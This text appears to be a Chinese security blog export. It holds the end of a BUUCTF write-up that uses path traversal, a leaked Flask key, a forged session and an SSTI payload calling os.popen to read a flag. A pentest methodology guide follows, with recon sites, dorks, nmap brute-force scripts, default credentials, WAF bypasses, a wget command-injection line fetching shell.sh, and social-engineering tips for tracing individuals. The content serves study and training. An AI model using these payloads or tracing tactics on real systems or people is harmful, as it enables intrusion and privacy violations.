部分环变量[user_dir_you_know]&#x2F;.ssh&#x2F;id_rsa(.pub) ssh登录的私钥&#x2F;公钥[user_dir_you_know]&#x2F;.viminfo vim的使用记录 实例CTF题目：BUUCTF第一章 web入门 https://buuoj.cn/challenges 参考：https://blog.csdn.net/qq_40909772/article/details/121381691 afr_1使用php伪协议php:&#x2F;&#x2F;filter读取文件： 1?p=php://filter/read=convert.base64-encode/resource=flag afr_2先目录扫描发现了img目录，直接进行访问。 然后尝试回溯目录： 1https://ec45dcbb-a35f-468b-9d40-51e0a6da2a38.node4.buuoj.cn/img/../ afr_3参考：https://blog.csdn.net/AAAAAAAAAAAA66/article/details/121490787 随意输入666： 进入article，发现文件参数name，但是没有文件后缀，应该是在后端给加上的： 判断文件读取判断是否存在文件读取漏洞，修改参数值试试： 发现可以读取其他文件，并且这里的路径为/home/nu11111111l/articles/ 尝试读取敏感文件尝试回溯路径获取系统文件，构造payload：article?name=../../../etc/passwd 但是并没有什么信息。 突破口为&#x2F;proc其实这一题的考点是&#x2F;proc目录的读取 查看系统启动时执行的命令： 1article?name=../../../proc/self/cmdline 发现server.py文件，查看该文件内容： &#x2F;proc&#x2F;[pid]&#x2F;cwd：通过cwd命令可以直接跳转到当前目录（网站目录） 1article?name=../../../proc/self/cwd/server.py 可以发现文件中执行了 flag.py 和 key.py 这两个文件。通过F12查看源码可以更清楚的查看server.py的内容： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#!/usr/bin/pythonimport osfrom flask import ( Flask, render_template, request, url_for, redirect, session, render_template_string )from flask_session import Session app = Flask(__name__)execfile(&#x27;flag.py&#x27;)execfile(&#x27;key.py&#x27;) FLAG = flagapp.secret_key = key@app.route(&quot;/n1page&quot;, methods=[&quot;GET&quot;, &quot;POST&quot;])def n1page(): if request.method != &quot;POST&quot;: return redirect(url_for(&quot;index&quot;)) n1code = request.form.get(&quot;n1code&quot;) or None if n1code is not None: n1code = n1code.replace(&quot;.&quot;, &quot;&quot;).replace(&quot;_&quot;, &quot;&quot;).replace(&quot;&#123;&quot;,&quot;&quot;).replace(&quot;&#125;&quot;,&quot;&quot;) # ----------------------------下面的代码存在SSTI模板注入-------------------------- if &quot;n1code&quot; not in session or session[&#x27;n1code&#x27;] is None: session[&#x27;n1code&#x27;] = n1code template = None if session[&#x27;n1code&#x27;] is not None: template = &#x27;&#x27;&#x27;&amp;lt;h1&amp;gt;N1 Page&amp;lt;/h1&amp;gt; &amp;lt;div class=&quot;row&amp;gt; &amp;lt;div class=&quot;col-md-6 col-md-offset-3 center&quot;&amp;gt; Hello : %s, why you don&#x27;t look at our &amp;lt;a href=&#x27;/article?name=article&#x27;&amp;gt;article&amp;lt;/a&amp;gt;? &amp;lt;/div&amp;gt; &amp;lt;/div&amp;gt; &#x27;&#x27;&#x27; % session[&#x27;n1code&#x27;] session[&#x27;n1code&#x27;] = None return render_template_string(template) @app.route(&quot;/&quot;, methods=[&quot;GET&quot;])def index(): return render_template(&quot;main.html&quot;)@app.route(&#x27;/article&#x27;, methods=[&#x27;GET&#x27;])def article(): error = 0 if &#x27;name&#x27; in request.args: page = request.args.get(&#x27;name&#x27;) else: page = &#x27;article&#x27; if page.find(&#x27;flag&#x27;)&amp;gt;=0: # 这里name参数过滤了flag关键词 page = &#x27;notallowed.txt&#x27; try: template = open(&#x27;/home/nu11111111l/articles/&#123;&#125;&#x27;.format(page)).read() except Exception as e: template = e return render_template(&#x27;article.html&#x27;, template=template) if __name__ == &quot;__main__&quot;:app.run(host=&#x27;0.0.0.0&#x27;,port=80, debug=False) 分析源码，确定漏洞利用分析源码，可以知道： 1.文件夹有2个python文件 flag.py 和密钥文件 key.py。 2.不能直接访问 flag.py，这里任意文件读取过滤了flag关键词。 3.源码存在SSTI模板注入 因为代码中有判断传入的session是否含n1code（ 这里可以理解为判断session的身份码），没有的话就创建这个session[‘n1code’]。 然后判断session[‘n1code’]是否为空，为空的的话就令 template（模板）为空，不为空的话就赋值 template 为一段实体编码过的HTML模板，并且**把session[‘n1code’]也带入到模板中渲染（渲染的代码会被执行，这里可以设计命令执行代码 )**。 也就是session中只要有n1code的内容，且不为空，就会被加入template模板中执行。这是只需在其中构造命令执行代码即可。 template解码后如下： 1template = &#x27;&#x27;&#x27;&lt;h1&gt;N1 Page&lt;/h1&gt; &lt;div class=&quot;row&gt; &lt;div class=&quot;col-md-6 col-md-offset-3 center&quot;&gt; Hello : %s, why you don&#x27;t look at our &lt;a href=&#x27;/article?name=article&#x27;&gt;article&lt;/a&gt;? &lt;/div&gt; &lt;/div&gt; &#x27;&#x27;&#x27; % session[&#x27;n1code&#x27;] 构造payloadSSTI模板注入 一般流程为：找到父类&lt;type ‘object’&gt;–&gt;寻找子类–&gt;找关于命令执行或者文件操作的模块。 1.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[\\&#x27;os\\&#x27;] 说人话就是通过上面划线的语句，打开python命令执行的模块，这样我们的命令popen(&#39;cat flag.py&#39;).read()才能被执行。 （os.popen() 方法用于从获取一个命令的输出）。 因此payload如下： 1&#123;&#x27;n1code&#x27;: &#x27;&#123;&#123;\\&#x27;\\&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[\\&#x27;os\\&#x27;].popen(\\&#x27;cat flag.py\\&#x27;).read()&#125;&#125;&#x27;&#125; python flask框架中的一些魔术方法__class__ 返回类型所属的对象 __mro__ 返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。 __base__ 返回该对象所继承的基类 &#x2F;&#x2F; __base__和__mro__都是用来寻找基类的 __subclasses__ 每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表 __init__ 类的初始化方法 __globals__ 对包含函数全局变量的字典的引用 加密payload，写入session： 还有一个问题是这个payload无法直接写入cookie中的session，因为session还用了key.py进行加密。 所以查看key.py，得到加密的密钥： 1article?name=../../../proc/self/cwd/key.py 然后使用工具 flask_session_cookie_manager3： https://codeload.github.com/noraj/flask-session-cookie-manager/zip/refs/heads/master 1flask_session_cookie_manager3.py encode -s &quot;Drmhze6EPcv0fN_81Bj-nA&quot; -t &quot;&#123;&#x27;n1code&#x27;: &#x27;&#123;&#123;\\&#x27;\\&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[\\&#x27;os\\&#x27;].popen(\\&#x27;cat flag.py\\&#x27;).read()&#125;&#125;&#x27;&#125;&quot; 加密结果为 1.eJwdikEKgCAQAL8SXlYvQl2CviKxbGoRmCtZhxD_nnUbZqaI2Ft2XkyiFACNaAPljNjoOBnRDHPDfC-_961IZcb-k3vcr3_cAi8UWjLAGWadOPkowdLVrYE2nR5Q-vTkpKpV1BcrHygP.YZuIBg.eOXIyEYlDww9MHN2rJZpk13froc 那么这个就是我们的身份码n1code+命令执行语句，作为session被模板渲染后执行，就能读取flag文件 执行攻击，拿到flag最后使用burp开始抓包，填入在cookie的session字段填入构造的payload： 从回传的网页中得到flag。 总结步骤(思路) 利用linux下 &#x2F;porc目录下文件作用查看当前运行进程，得到server.py 分析server.py得知存在 key.py 和 flag.py（不可查取） ，且存在SSTI模板注入漏洞 构造模板注入语句，并使用flask_session_cookie_manager3.py脚本进行密钥加密 burp改包实现session伪造，命令执行。得到flag。 关于SSTI模板注入： http://elssm.top/2021/11/29/SSTI%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/ https://www.freebuf.com/column/187845.html 关于cookie、session、token： https://blog.csdn.net/qq_40925189/article/details/107030620","raw":null,"content":null,"categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://frankcao3.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"渗透测试全流程","slug":"渗透测试/0. 渗透测试全流程总结","date":"2022-08-04T16:00:00.000Z","updated":"2023-10-05T11:58:27.600Z","comments":true,"path":"posts/[object Object]/渗透测试/0. 渗透测试全流程总结/undefined.html","link":"","permalink":"https://frankcao3.github.io/posts/[object%20Object]/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/0.%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A8%E6%B5%81%E7%A8%8B%E6%80%BB%E7%BB%93/undefined","excerpt":"","text":"渗透测试全流程参考： https://www.freebuf.com/articles/web/290055.html https://www.freebuf.com/vuls/360173.html 从旁观者的角度了解整个WEB应用乃至整个目标的全貌，但是资产是收集不完的，可以边收集，边进行一定程度的测试。信息收集最小的粒度应是目录。 信息收集123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051dirbusterkali自带的一款工具，fuzz很方便gorailgun一款自动化做的非常好的工具，信息收集全过程都能用上OneForALL一款子域名收集工具，收集接口非常多，比自己收藏一大堆网址方便，收集子域自动去重，去无效，并进行拓展layer子域名挖掘机和subdomainbrute拉满线程去跑子域名的工具，都是老朋友见面，不用多说了一些信息收集的网站http://www.webscan.cc/ C端同服扫描https://www.tianyancha.com/ 天眼查https://fofa.so/ 网络空间搜索引擎http://www.yunsee.cn/ 云悉WEB资产搜集https://www.shodan.io/ shodan搜索引擎https://www.zoomeye.org/ 知道创宇眼http://www.dianhua.cn/ 电话帮http://haoma.sogou.com/rz/ 搜狗号码通http://haoma.baidu.com/query 百度号码认证http://www.gogoqq.com/ 非好友情况如何查看QQ空间http://whitepages.com 房产登记信息查询http://tool.chinaz.com/ 站长之家http://www.webscan.cc/ 在线工具http://www.882667.com 查询IP所在位置http://www.yunsee.cn 云悉在线WEB指纹CMS识别平台http://whatweb.bugscaner.com/look/ 指纹识别临时邮箱https://temp-mail.org/zh/https://www.linshiyouxiang.net/https://www.guerrillamail.com/zh/https://www.moakt.com/zhhttp://links.icamtech.com/在线C段/同服(旁站)https://rapiddns.io/sameiphttp://www.webscan.cc/https://chapangzhan.comhttps://phpinfo.me/bing.php漏洞库https://www.cnvd.org.cn/https://www.securityfocus.com/https://packetstormsecurity.com/https://www.exploit-db.com/https://cxsecurity.com/https://shuimugan.com/http://0day.today/ 1. 目标确认1.1 域名注册信息通过如下步骤确认目标所有者信息： Whois 目标域名&#x2F;主机名：whois http://example.com解析目标域名&#x2F;主机名的IP地址：dig +short http://example.com获取域名的详细解析过程：dig +trace http://example.com后续用于字典制作和进一步收集目标信息的基础 获取真实IP： 浏览器切换手机模式，可能是真实ip，公众号、小程序中的资产也可能对应真实ip。 验证是否存在CDN 方法1： 使用各种多地 ping 的服务，查看对应 IP 地址是否唯一，如果不唯一多半是使用了CDN， 多地 Ping 网站有：http://ping.chinaz.com/http://ping.aizhan.com/http://ce.cloud.360.cn/ 方法2： 试用nslookup进行检测，如果返回域名解析对应多个IP，那么多半是试用了CDN.nslookup http://example.com 方法3: 在线工具查看是否存在CDN，可以参考以下站点:http://www.cdnplanet.com/tools/cdnfinderhttp://www.ipip.net/ip.html &#x3D;&#x3D;绕过CDN查找网站真实IP&#x3D;&#x3D; 1. 查询历史DNS记录(ip的历史解析域名，域名的历史解析ip) 查看 IP 与 域名绑定的历史记录，可能会存在使用 CDN 前的记录，相关查询网站有：https://dnsdb.io/zh-cn/https://x.threatbook.cn/https://censys.io/ipv4?q=baidu.com非常牛逼的IP记录站，还能分析内链之类找出可能的IP地址，此外还会记录历史。http://viewdns.info 同样是个令站长十分蛋疼的DNS历史记录网站，记录了几年内的更改记录。http://securitytrails.comhttps://site.ip138.com/ 庞大的DNS历史数据库，可以查出几年内网站用过的IP、机房信息等。http://iphostinfo.com注意：这个网站可以遍历FTP、MX记录和常见二级域名，有些站长喜欢把邮箱服务也放在自己主机上，侧面泄露了真实的IP地址，通过这个网站可以进行检查。 2. 查询子域名（捷径，去众测平台、github找官方发布过的） 注意：有可能有些站长只给主站或流量大的子域名做了CDN,而很多子域名都是和主站在同一台服务器上，或者 C段中，这样可以通过子域名来辅助找到网站真实IP爆破子域名: 主动式 layer子域名挖掘机（字典要自己丰富）http://z.zcjun.com/(在线子域名挖掘)fuzzdomain 很好用，速度快 被动式 搜索引擎拿子域名、旁站（同IP网站）、C段： 可用搜索引擎语法查询子域名：谷歌、百度、bing、搜狗(搜索微信文章)、雅虎等略有差异 详细用法:（1）site: &#x3D;主域名,搜索其主要域名下面的子域名（2）allintext: &#x3D; 搜索文本,但不包括网页标题和链接（3）allinlinks: &#x3D; 搜索链接, 不包括文本和标题。（4）related:URL &#x3D; 列出于目标URL地址有关的网页。（5）link:URL &#x3D; 列出到链接到目标URL的网页清单。（6）使用“-”去掉不想看的结果，例如site:http://baidu.com http://-image.baidu.com 百度语法：https://www.cnblogs.com/k0xx/p/12794452.html 谷歌语法：https://blog.csdn.net/u012991692/article/details/82937100?biz_id=102&amp;utm_term=Googlehack&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-82937100&amp;spm=1018.2118.3001.4187 GHDB：https://www.exploit-db.com/google-hacking-database 3. 资产搜索(旁站\\C段\\特征): https://www.shodan.io(资产相关或特征值关键字爆ip)https://fofa.sohttps://www.zoomeye.org/http://www.yunsee.cn/info.html （云悉在线资产平台)http://subdomain.chaxun.la （查询啦）https://www.virustotal.com/gui/home/searchhttps://dnsdumpster.com/https://duckduckgo.com （一个不会存储你个人信息的搜索引擎）https://crt.sh/（SSL证书查询）https://icp.aizhan.com/(域名备案) 4. 对方服务器给自己发邮件暴露IP 5. 使用其他地区的服务器ping网站，当地可能没做CDN 6. 借助漏洞 若存在web漏洞，服务器主动与我们发起请求连接，我们也能获取目标站点真实ip。例如xss、ssrf、命令执行反弹shell等。 1.2 DNS信息查询目的: 注册者名称及邮箱,再反查其他域名手机号 座机号ASN号 地址在线DNS信息查询工具https://dnsdumpster.com/https://www.dnsdb.io （DNS搜索引擎）http://searchdns.netcraft.comhttp://whois.nawang.cn/https://whois.aliyun.com/https://whois.west.cn/http://whois.chinaz.com/ (站长之家)https://www.tianyancha.com/ （天眼查）http://www.gsxt.gov.cn/index.html （国家企业信用信息系统）http://www.beianbeian.com/ （ICP备案查询） 1.3 测试域传送漏洞域传送是一种DNS事务，用于在主从服务器间复制DNS记录。虽然如今已经很少见主机会开启，但是还是应该确认一下。一旦存在域传送漏洞，就意味着你获取了整个域下面所有的记录。dnsrecon -d http://example.comdnsenum http://example.com 包含自动检测域传送漏洞dnsenum还能爆破子域名，功能比较多，详见：https://blog.csdn.net/weixin_43263851/article/details/108955964 1.4 业务相关github泄露：in:name test #仓库标题搜索含有关键字 SpringCloudin:descripton test #仓库描述搜索含有关键字in:readme test #Readme文件搜素含有关键字stars:&gt;3000 test #stars数量大于3000的搜索关键字stars:1000..3000 test #stars数量大于1000小于3000的搜索关键字forks:&gt;1000 test #forks数量大于1000的搜索关键字forks:1000..3000 test #forks数量大于1000小于3000的搜索关键字size:&gt;&#x3D;5000 test #指定仓库大于5000k(5M)的搜索关键字pushed:&gt;2019-02-12 test #发布时间大于 2019-02-12的搜索关键字created:&gt;2019-02-12 test #创建时间大于2019-02-12的搜索关键字user:test #用户名搜素license:apache-2.0 test #明确仓库的 LICENSE 搜索关键字language:java test #在java语言的代码中搜索关键字user:test in:name test #组合搜索,用户名test的标题含有test的 网盘泄露：各种云网盘，详见虫部落搜索:http://magnet.chongbuluo.com敏感路径扫描：https://github.com/ring04h/weakfilescan 2. OSINT 公开情报收集2.1 社工技巧查看注册的网站：0xreg reg007 知道账号去已注册的网站找回密码，可以看到打码后的用户名、邮箱、真实姓名等信息，如果运气好没准能从数据包或html中找到未被打码的信息 可以从这些方面判断用户是否注册过 找回密码：输入账号，如果进入下一步了则该账号存在 登录：输入账号和密码，如果提示密码错误，则表示该用户已存在 注册：填写账号时一般网站会去检测该账号是否已存在，如果已存在则会提示不可重复注册 知道QQ 通过QQ邮箱和QQ号搜索支付宝、淘宝账号等其他可能的常用平台去腾讯\\新浪微博搜索通过微信搜索查看QQ空间\\相册\\地区\\星座\\生日\\昵称(后续构建字典以及跨平台搜集)通过说说、留言、日志找到其好友加QQ钓鱼\\共同好友\\可能认识的人 知道手机号 搜索QQ、微信、钉钉等社交账号在比较火的一些APP和网站上注册或忘记密码来判断是否注册过账号查询支付宝、QQ交易账号，尝试输入常见姓氏获取名字(转账到该手机号,会提示输入姓氏验证)通过对方的职业、兴趣找到该领域知名度较高的社交网站反查根据在QQ空间、朋友圈等动态用百度识图识别照片在微博、ins、Twitter、fb、百度贴吧搜索相近关键字，按地域、年龄、男女、用户名等筛选 留意社交动态 发布时间线使用什么客户端 iPhone Android还是浏览器针对客户端预先制定exploit注意每一条链接 &#x2F; 图片 &#x2F; 视频链接可能包含用户ID图片可能包含水印，exif可能会有GPS定位和手机类型,图片内容特征视频也有可能有水印暴露社交账号ID,拍摄地点从最早发布的动态看起，会有很大收获一般得到一个账号的密码就相当于得到了其他账号的密码一般人不同账号的用户名都是相同或相近的一般人的社交账号头像用的都是一样的尝试破解社保、公积金账号、身份z号（出生地、生日、星座、派出所代码） 虫部落快搜之文件搜索:https://search.chongbuluo.com/ qq群、群文件、贴吧论坛、目标自用论坛等社交平台钓鱼和信息泄露(爬邮箱等信息) 电子邮件伪造、网络钓鱼下载恶意程序输入敏感信息 大部分信息可以用来生成密码字典 对人：说服对方达成一致、恐吓对方（敏感词、漏洞、病毒、权威机构名称、），钓鱼获取信息 2.2 搜索引擎OSINTGoogle Hacking(baidu\\bing\\souhu\\github) GoogleHacking常用语法 1、intext：（仅针对Google有效） 把网页中的正文内容中的某个字符作为搜索的条件2、intitle： 把网页标题中的某个字符作为搜索的条件3、cache： 搜索搜索引擎里关于某些内容的缓存，可能会在过期内容中发现有价值的信息4、filetype&#x2F;ext： 指定一个格式类型的文件作为搜索对象5、inurl： 搜索包含指定字符的URL6、site： 在指定的(域名)站点搜索相关内容 GoogleHacking其他语法 1、引号 ” ” 把关键字打上引号后，把引号部分作为整体来搜索2、or 同时搜索两个或更多的关键字3、link 搜索某个网站的链接 link:http://baidu.com即返回所有和baidu做了链接的URL4、info 查找指定站点的一些基本信息 GoogleHackingDatabase:google-hacking-databaseGoogleHacking典型用法(特定资产的万能密码也要积累) 管理后台地址： 1234site:http://target.com intext:管理 | 后台 | 后台管理 | 登陆 | 登录 | 用户名 | 密码 | 系统 | 账号 | login | systemsite:http://target.com inurl:login | inurl:admin | inurl:manage| inurl:manager | inurl:admin_login | inurl:system | inurl:backendsite:http://target.com intitle:管理 | 后台 | 后台管理 | 登陆 | 登录 上传类漏洞地址： 12site:http://target.com inurl:filesite:http://target.com inurl:upload 注入页面：（批量注入工具、结合搜索引擎） 1site:http://target.com inurl:php?id= 编辑器页面： 1site:http://target.com inurl:ewebeditor 目录遍历漏洞： 1site:http://target.com intitle:index.of SQL错误： 1site:http://target.com intext:&quot;sql syntax near&quot; | intext:&quot;syntax error has occurred&quot; | intext:&quot;incorrect syntax near&quot; | intext:&quot;unexpected end of SQL command&quot; | intext:&quot;Warning: mysql_connect()&quot; | intext:”Warning: mysql_query()&quot; | intext:”Warning: pg_connect()&quot; phpinfo()： 1site:http://target.com ext:php intitle:phpinfo &quot;published by the PHP Group&quot; 配置文件泄露： 1site:http://target.com ext:.xml | .conf | .cnf | .reg | .inf | .rdp | .cfg | .txt | .ora | .ini 数据库文件泄露： 1site:http://target.com ext:.sql | .dbf | .mdb | .db 日志文件泄露 1site:http://target.com ext:.log 备份和历史文件泄露 1site:http://target.com ext:.bkf | .bkp | .old | .backup | .bak | .swp | .rar | .txt | .zip | .7z | .sql | .tar.gz | .tgz | .tar 公开文件泄露 1site:http://target.com filetype:.doc | .docx | .xls | .xlsx | .ppt | .pptx | .odt | .pdf | .rtf | .sxw | .psw | .csv 邮箱信息 123site:http://target.com intext:@http://target.comsite:http://target.com 邮件site:http://target.com email 社工信息 1site:http://target.com intitle:账号 | 密码 | 工号 | 学号 | 身份z 2.3 浏览器实用插件Wappalyzer：识别网站使用的中间件及其版本，再去漏洞库和搜索引擎找公开披露的漏洞 SwitchOmega：快捷切换代理 shodan：识别开放端口，主机服务等（被动信息搜集） hacktools:综合插件,很强大 firefox渗透便携版version48,工具集成很多 注意：根据获得服务、中间件信息、编辑器版本、数据库等OSINT去各大漏洞库、搜索引擎找漏洞利用 2.4 乌云和cnvd乌云库\\乌云镜像\\GHDB\\CNVD等公开漏洞库 3. &#x3D;&#x3D;打点&#x3D;&#x3D;打点方法 打点原理 主动探测从管理员和用户的角度了解整个WEB应用乃至整个目标的全貌，主动探测会暴露ip以及留下日志信息，所以要… 1. 主动扫描1.1 常见服务漏洞（&#x3D;&#x3D;nmap&#x3D;&#x3D;）nmap 功能包括脚本扫描，隐蔽扫描，端口扫描，服务识别，OS识别，探测WAF。 nmap脚本主要分为以下几类，在扫描时可根据需要设置 –script&#x3D;类别，这种方式进行比较笼统的扫描： auth: 负责处理鉴权证书（绕开鉴权）的脚本broadcast: 在局域网内探查更多服务开启状况，如dhcp&#x2F;dns&#x2F;sqlserver等服务brute: 提供暴力破解方式，针对常见的应用如http&#x2F;snmp等default: 使用-sC或-A选项扫描时候默认的脚本，提供基本脚本扫描能力discovery: 对网络进行更多的信息，如SMB枚举、SNMP查询等dos: 用于进行拒绝服务攻击exploit: 利用已知的漏洞入侵系统external: 利用第三方的数据库或资源，例如进行whois解析fuzzer: 模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞intrusive: 入侵性的脚本，此类脚本可能引发对方的IDS&#x2F;IPS的记录或屏蔽malware: 探测目标机是否感染了病毒、开启了后门等信息safe: 此类与intrusive相反，属于安全性脚本version: 负责增强服务与版本扫描（Version Detection）功能的脚本vuln: 负责检查目标机是否有常见的漏洞（Vulnerability），如是否有MS08_067 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051nmap --script=auth 192.168.137.*负责处理鉴权证书（绕开鉴权）的脚本,也可以作为检测部分应用弱口令nmap -n -p445 --script=broadcast 192.168.137.4在局域网内探查更多服务开启状况nmap --script=brute 192.168.137.*提供暴力破解的方式 可对数据库，smb，snmp等进行简单密码的暴力猜解nmap --script=default 192.168.137.* 或者 nmap -sC 192.168.137.*默认的脚本扫描，主要是搜集各种应用服务的信息，收集到后，可再针对具体服务进行攻击nmap --script=vuln 192.168.137.*检查是否存在常见漏洞nmap --script external 202.103.243.110利用第三方的数据库或资源，例如进行whois解析nmap --script banner ipnmap -p port -sV ip获取软件版本信息nmap -O ip操作系统信息，版本nmap -A -v -sS -T2 ip完整信息获取,详细显示，syn探测，高速扫描，系统和服务版本信息，脚本扫描和路由跟踪,外网扫描T2比较合适，T4以上不准确扫描前1000号TCP端口nmap 192.168.100.2Ping扫描8个本地主机(按ARP、ICMP、TCP 80的顺序)nmap –sP 192.168.100.0 -7扫描80,443端口nmap -p 80,443 192.168.100.2扫描前1000号TCP端口，OS指纹，服务，然后运行一个NSE脚本sudo nmap -A 192.168.100.2扫描全部65535个TCP端口，OS指纹，服务，然后运行一个NSE脚本sudo nmap –A –p- 192.168.100.2扫描前1000号UDP端口sudo nmap -sU 192.168.100.2扫描所有65535个UDP端口sudo nmap -sU –p- 192.168.100.2扫描所有65535个UDP端口，并获取服务、OS指纹，之后运行一些NSE脚本sudo nmap –sU -p- -A 192.168.100.2 隐蔽扫描： 123nmap -sN 10.10.10.129nmap -sN 10.10.10.129nmap -sF 10.10.10.129 &#x3D;&#x3D;-sN&#x3D;&#x3D; 是Null扫描，是通过发送非常规的TCP通信数据包进行探测。Null扫描不会标记任何数据包，目标主机相应端口关闭，会响应一个RST数据包，端口开启则不会响应任何信息； 21端口开启，所以-sN扫描未返回任何数据包： 发送的数据包： &#x3D;&#x3D;-sF&#x3D;&#x3D; 是FIN扫描，当我们使用TCP SYN扫描时可能会被目标主机的防火墙发现，会阻止SYN数据包，这时我们使用TCP FIN扫描方式会有很好的穿透效果。使用FIN扫描不需要完成TCP握手，TCP FIN扫描是向目标端口发送一个FIN包，收到响应RST包则说明目标端口是开放的，如果没有收到RST则说明是关闭的。 发送的FIN数据包： 邮件服务端口110开启，所以返回RST数据包： &#x3D;&#x3D;-sX&#x3D;&#x3D; 是Xmas扫描，发送的数据包的FIN、PSH和URG标记位置打开，即标志为1。如果目标主机的FIN、PSH和URG标记位是开放的，则会响应一个RST标志包； 发送的数据包，FIN、PSH和URG标记位为1： 目标主机的FIN、PSH和URG标记位是开放的。所以返回RST数据包，并且可以发现目标主机的FIN、PSH和URG标记位为0： 1.2 常见端口漏洞利用快速扫描：Masscan -p80,800 ip –rate&#x3D;10000 21 &#x2F; FTP 匿名&#x2F;暴力破解拒绝服务 22 &#x2F; SSH 暴力破解 23 &#x2F; telnet Winbox(CVE-2018-14847)https://github.com/BasuCert/WinboxPoC弱口令 &#x2F; 暴力破解 161 &#x2F; snmp 弱口令https://blog.csdn.net/archersaber39/article/details/78932252 389 &#x2F; ladp 匿名访问https://www.cnblogs.com/persuit/p/5706432.htmlladp注入http://www.4hou.com/technology/9090.htmlhttps://www.freebuf.com/articles/web/149059.html 443 &#x2F; ssl openssl心脏出血https://paper.seebug.org/437/http://www.anquan.us/static/drops/papers-1381.htmlhttps://www.freebuf.com/sectool/33191.html 445 &#x2F; smb win10拒绝服务永恒之蓝RCE 875 &#x2F; rsync 匿名访问http://www.anquan.us/static/bugs/wooyun-2016-0190815.htmlhttps://paper.seebug.org/409/http://www.91ri.org/11093.html 1433 &#x2F; mssql 暴力破解http://www.anquan.us/static/drops/tips-12749. htmlhttps://www.seebug.org/appdir/Microsoft%20SQL%20Server 1521 &#x2F; oracle 暴力破解https://www.exploit-db.com/exploits/33084 2601 &#x2F; zebra http://www.anquan.us/static/bugs/wooyun-2013-047409.html 3128 &#x2F; squid 3306 &#x2F; mysql RCEhttp://www.91ri.org/17511.htmlCVE-2015-0411hash破解https://www.freebuf.com/column/153561.htmlwaf绕过https://www.freebuf.com/articles/web/155570.htmlgeneral_log_file getshellhttps://www.freebuf.com/column/143125.html提权http://www.91ri.org/16540.html 3312 &#x2F; kangle getshellhttps://www.secpulse.com/archives/23927.html 3389 &#x2F; rdp shift 放大镜 输入法绕过 guest用户永恒之蓝(ESTEEMAUDIT)https://www.freebuf.com/articles/system/132171.htmlhttps://www.anquanke.com/post/id/86328ms12-020https://blog.csdn.net/meyo_leo/article/details/77950552 4440 &#x2F; rundeck https://www.secpulse.com/archives/29500.html 4848 &#x2F; glassfish 文件读取https://www.secpulse.com/archives/42277.htmlhttps://www.anquanke.com/post/id/85948GlassFish2 &#x2F; admin:admin GlassFish3,4 &#x2F; 如果管理员不设置帐号本地会自动登录,远程访问会提示配置错误 5432 &#x2F; PostgreSQL RCEhttps://www.cnblogs.com/KevinGeorge/p/8521496.htmlhttps://www.secpulse.com/archives/69153.html默认账号postgres参考http://www.91ri.org/13070.htmlhttp://www.91ri.org/6507.html 5672,15672,4369,25672 &#x2F; RabbitMQ（guest&#x2F;guest） 5900 &#x2F; VNC https://www.seebug.org/appdir/RealVNC 5984 &#x2F; CouchDB http://xxx:5984/_utils/ 6082 &#x2F; varnish CLI 未授权https://www.secpulse.com/archives/10681.html 6379 &#x2F; redis Redis未授权ssh publickeycrontabwebshell反序列化开机自启文件夹写bat参考https://www.freebuf.com/column/170710.html 7001,7002 &#x2F; WebLogic 默认弱口令weblogic&#x2F;weblogic ,weblogic&#x2F;welcom ,weblogic&#x2F;welcom1,weblogic1&#x2F;weblogic反序列CVE-2018-2628https://www.freebuf.com/articles/web/169770.htmlhttps://www.seebug.org/appdir/WebLogic 9200,9300 &#x2F; elasticsearch CVE-2015-1427http://www.anquan.us/static/drops/papers-5142.htmlCVE-2018-17246https://www.seebug.org/vuldb/ssvid-97730参考https://www.seebug.org/search/?keywords=elasticsearch 9000 &#x2F; fcgi https://paper.seebug.org/289/ 9043 &#x2F; WebSphere Websphere8.5https://localhost:9043/ibm/console/logon.jspWebsphere6-7http://localhost:9043/ibm/console后台未授权，登录后可部署WAR包SOAP服务有反序列化弱口令：admin &#x2F; password 11211 &#x2F; memcache 未授权UDP反射https://shockerli.net/post/memcached-udp-reflection-attack-bug/ 27017,27018 &#x2F; Mongodb 未授权注入https://www.anquanke.com/post/id/83763phpMoAdmin RCEhttps://www.aqniu.com/threat-alert/6978.html 50000 &#x2F; SAP SAP命令执行https://www.secpulse.com/archives/20204.html 50070,50030 &#x2F; hadoop 未授权https://www.freebuf.com/vuls/173638.html命令执行host:50060&#x2F;pstack?pid&#x3D;123|wget http://somehost/shell.shhttps://www.seebug.org/search/?keywords=hadoop其他http://www.91ri.org/15441.html 1.3 WAF 及 bypass探测WAF。 Nmap探测WAF有两种脚本，一种是http-waf-detect，一种是http-waf-fingerprint。 12nmap -p port --script=http-waf-detect ip wafw00f：kaili中的防火墙探测工具 1wafw00f -a http://example.com sqlmap 1sqlmap-u “http://www.vxxxx.org/ex.php?id=1” --identify-waf bypass： （1）请求真实ip绕过waf：部分watf部署架构的特性，部分waf并不是直接串在目标站点线路上，而是通过DNS解析的形式部署，此时可以先探测到目标站点的真实ip直接请求ip以此绕过waf的检测； （2）检测内容范围绕过：waf性能限制，检测特定内容前几k或几十K的内容，然后在此特定内容段内填充物用数据， payload放于物用数据后，以此绕过检测； （3）协议盲区绕过：waf根据自己的防御策略所支持的协议特性，针对该协议内的请求进行检查，但是存在一些协议检测或协议运行机制上的缺陷导致被绕过，例如协议未覆盖、协议解析不正确、协议解析遗漏等； （4）检测规则绕过：waf工程师规则编写经验、规则覆盖面等问题，来绕过检测，例如利用 MySQL对一些特殊字符处理的特性、语法特性绕过。 （5）文件包含绕过：相对路径、绝对路径。 绕过技术： 大小写转换 URL编码 Unicode HTML编码 混合编码 使用注释 双重编码 通配符混淆 垃圾字符 换行 未初始化的变量 制表符和换行 令牌破坏者 其他格式的混淆 1.4 目录、后台和敏感路径文件扫描御剑 目录（土司专版，笔记里有）、后台扫描（图片属性地址暴露）， 完善目录和账密字典方法： 